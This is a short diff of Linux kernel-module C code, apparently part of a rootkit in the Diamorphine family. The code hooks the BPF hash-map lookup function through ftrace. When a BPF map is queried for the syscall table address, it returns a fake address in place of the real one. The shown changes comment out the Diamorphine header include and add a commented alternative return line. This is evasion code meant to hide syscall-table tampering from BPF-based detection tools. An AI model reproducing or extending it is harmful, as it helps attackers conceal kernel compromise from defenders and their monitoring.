@@ -8,7 +8,7 @@
 #include "bpf/hashtab.h"
 #include "ftrace_helper.h"
 #include "hooks.h"
-#include "diamorphine.h"
+// #include "diamorphine.h"
 
 static void *(*orig_htab_map_lookup_elem)(struct bpf_map *map, void *key);
 
@@ -52,7 +52,8 @@ static void *hook_htab_map_lookup_elem(struct bpf_map *map, void *key)
 		    extern unsigned long *fake_sys_call_table_addr;
 
 		    pr_info("The original syscall_table_addr from map is: %p But %p returned\n", *syscall_table_addr, *fake_sys_call_table_addr);
-	    	return *fake_sys_call_table_addr;
+	    	// return (void *)fake_sys_call_table_addr;
+			return *fake_sys_call_table_addr;
 		}
     }
 
